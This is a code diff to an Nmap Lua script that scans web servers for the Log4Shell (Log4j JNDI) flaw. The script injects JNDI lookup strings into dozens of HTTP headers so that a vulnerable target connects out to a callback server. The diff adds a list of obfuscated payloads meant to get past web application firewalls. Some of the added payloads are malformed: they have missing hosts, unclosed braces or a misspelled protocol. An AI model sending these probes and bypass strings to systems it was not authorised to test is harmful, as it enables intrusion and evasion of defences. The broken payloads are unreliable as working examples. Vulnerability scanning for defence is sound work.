@@ -51,16 +51,18 @@ categories = {"vuln", "safe", "external"}
 ---
 -- @usage
 -- nmap --script log4shell --script-args log4shell.callback-server=127.0.0.1:1389 -p <port> <host>
--- @args log4shell.callback-server  Callback server
--- @args log4shell.http-headers     Comma-separated list of HTTP headers
--- @args log4shell.http-method      HTTP method (default: GET)
--- @args log4shell.url-path         URL path (default: /)
+-- @args callback-server  Callback server
+-- @args http-headers     Comma-separated list of HTTP headers
+-- @args http-method      HTTP method (default: GET)
+-- @args url-path         URL path (default: /)
+-- @args waf-bypass       WAF bypass
 --
 -- @output
 -- PORT   STATE SERVICE
 -- 80/tcp open  http
 -- | log4shell: 
--- |   Payload: ${jndi:ldap://172.17.42.1:13890/log4shell}
+-- |   Payloads: 
+-- |     ${jndi:ldap://127.0.0.1:389}
 -- |   Path: /
 -- |   Method: GET
 -- |   Headers: 
@@ -70,8 +72,10 @@ categories = {"vuln", "safe", "external"}
 --
 -- @xmloutput
 -- <script id="log4shell" output="[...]">
---   <elem key="Payload">${jndi:ldap://172.17.42.1:13890/log4shell}</elem>
---   <elem key="Path">//</elem>
+--   <table key="Payloads">
+--   <elem>${jndi:ldap://127.0.0.1:389}</elem>
+--   </table>
+--   <elem key="Path">/</elem>
 --   <elem key="Method">GET</elem>
 --   <table key="Headers">
 --     <elem key="X-Api-Version">200 </elem>
@@ -85,13 +89,14 @@ categories = {"vuln", "safe", "external"}
 -- 2021-12-11 - First release
 -- 2021-12-13 - Test all headers known
 --            - Changed output format
---            - Added log4shell.callback-server arg (instead of log4shell.exploit-server)
--- 2021-12-14 - Added log4shell.http-headers arg
+--            - Added "callback-server" arg (instead of "exploit-server")
+-- 2021-12-14 - Added "http-headers" arg
 --            - Improved output
 -- 2021-12-15 - Improved XML result
---            - Added log4shell.http-method arg (default: GET)
---            - Added log4shell.url-path arg (default: /)
+--            - Added "http-method" arg (default: GET)
+--            - Added "url-path" arg (default: /)
 --            - Removed target info in LDAP URI
+-- 2021-12-16 - Added "waf-bypass" arg (default: false)
 --
 
 local http      = require "http"
@@ -112,39 +117,73 @@ action = function(host, port)
   local http_headers    = stdnse.get_script_args(SCRIPT_NAME .. '.http-headers') or nil
   local http_method     = stdnse.get_script_args(SCRIPT_NAME .. '.http-method') or 'GET'
   local url_path        = stdnse.get_script_args(SCRIPT_NAME .. '.url-path') or '/'
+  local waf_bypass      = stdnse.get_script_args(SCRIPT_NAME .. '.waf-bypass') or nil
 
-  local exploit_payload = string.format('${jndi:ldap://%s/log4shell}', callback_server)
+  -- Default payload
+  local payload = '${jndi:ldap://%s}'
 
-  local payload_headers = {'X-Api-Version', 'User-Agent', 'Cookie', 'Referer', 'Accept-Language', 'Accept-Encoding', 'Upgrade-Insecure-Requests', 'Accept', 'upgrade-insecure-requests', 'Origin', 'Pragma', 'X-Requested-With', 'X-CSRF-Token', 'Dnt', 'Content-Length', 'Access-Control-Request-Method', 'Access-Control-Request-Headers', 'Warning', 'Authorization', 'TE', 'Accept-Charset', 'Accept-Datetime', 'Date', 'Expect', 'Forwarded', 'From', 'Max-Forwards', 'Proxy-Authorization', 'Range,', 'Content-Disposition', 'Content-Encoding', 'X-Amz-Target', 'X-Amz-Date', 'Content-Type', 'Username', 'IP', 'IPaddress', 'Hostname'}
+  -- WAF (Web Application Firewall) bypass payloads
+  local waf_payloads = {
+    '${jndi:rmi://%s}',
+    '${${lower:jndi}:${lower:rmi}://%s}',
+    '${jndi:${lower:r}${lower:m}${lower:i}',
+    '${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://%s}',
+
+    '${jndi:dns://%s}',
+    '${${lower:jndi}:${lower:dns}://%s}',
+    '${jndi:${lower:d}${lower:n}${lower:s}',
+    '${${::-j}${::-n}${::-d}${::-i}:${::-d}${::-n}${::-s}://%s}',
+
+    '${jndi:ldap://%s}',
+    '${${lower:jndi}:${lower:ldap}://%s}',
+    '${jndi:${lower:l}${lower:d}a${lower:p}',
+    '${jndi:${lower:l}${lower:d}${lower:d}${lower:p}',
+    '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}a${::-p}://%s}',
+    '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://%s}',
+  }
+
+  local payloads = { payload }
+
+  local headers = {'X-Api-Version', 'User-Agent', 'Cookie', 'Referer', 'Accept-Language', 'Accept-Encoding', 'Upgrade-Insecure-Requests', 'Accept', 'upgrade-insecure-requests', 'Origin', 'Pragma', 'X-Requested-With', 'X-CSRF-Token', 'Dnt', 'Content-Length', 'Access-Control-Request-Method', 'Access-Control-Request-Headers', 'Warning', 'Authorization', 'TE', 'Accept-Charset', 'Accept-Datetime', 'Date', 'Expect', 'Forwarded', 'From', 'Max-Forwards', 'Proxy-Authorization', 'Range,', 'Content-Disposition', 'Content-Encoding', 'X-Amz-Target', 'X-Amz-Date', 'Content-Type', 'Username', 'IP', 'IPaddress', 'Hostname'}
 
   if http_headers ~= nil then
-    payload_headers = stringaux.strsplit(',', http_headers)
+    headers = stringaux.strsplit(',', http_headers)
   end
 
-  output.Payload = exploit_payload
-  output.Path    = url_path
-  output.Method  = http_method
-  output.Headers = {}
+  output.Path     = url_path
+  output.Method   = http_method
+  output.Payloads = {}
+  output.Headers  = {}
 
-  for i, payload_header in ipairs(payload_headers) do
+  if waf_bypass ~= nil then
+    payloads = waf_payloads
+  end
 
-    stdnse.debug1(string.format('%s --> %s', payload_header, exploit_payload))
+  for i, payload in ipairs(payloads) do
 
-    local header = {
-      [payload_header] = exploit_payload
-    }
+    local exploit_payload = string.format(payload, callback_server)
+    output.Payloads[#output.Payloads + 1] = exploit_payload
 
-    local response = http.generic_request(host, port.number, http_method:upper(), url_path, { header = header, no_cache = true })
-    local status   = response.status
-    local status_string = http.get_status_string(response)
+    for x, payload_header in ipairs(headers) do
 
-    if status == nil then
-      -- Something went really wrong out there
-      -- According to the NSE way we will die silently rather than spam user with error messages
-    else
-      output.Headers[payload_header] = status_string
+      stdnse.debug1(string.format('%s --> %s', payload_header, exploit_payload))
+
+      local header = {
+        [payload_header] = exploit_payload
+      }
+
+      local response = http.generic_request(host, port.number, http_method:upper(), url_path, { header = header, no_cache = true })
+      local status   = response.status
+
+      if status == nil then
+        -- Something went really wrong out there
+        -- According to the NSE way we will die silently rather than spam user with error messages
+      else
+        local status_string = http.get_status_string(response)
+        output.Headers[payload_header] = status_string
+      end
+
     end
-
   end
 
   output.Note = string.format('(!) Inspect the callback server (%s) or web-application (%s:%s) logs', callback_server, host.ip, port.number)
